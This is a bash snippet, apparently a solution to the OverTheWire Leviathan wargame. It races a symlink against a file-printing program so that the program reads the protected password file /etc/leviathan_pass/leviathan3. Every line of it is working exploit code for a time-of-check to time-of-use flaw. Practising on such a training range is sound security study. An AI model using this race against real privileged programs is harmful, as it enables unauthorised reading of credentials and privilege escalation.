
    echo "hello" > myfile
    for ((i=0; i<10; i++));
    do
    ln -sf myfile t &
    ~/printfile t &
    ln -sf /etc/leviathan_pass/leviathan3 t &
    sleep .5
    done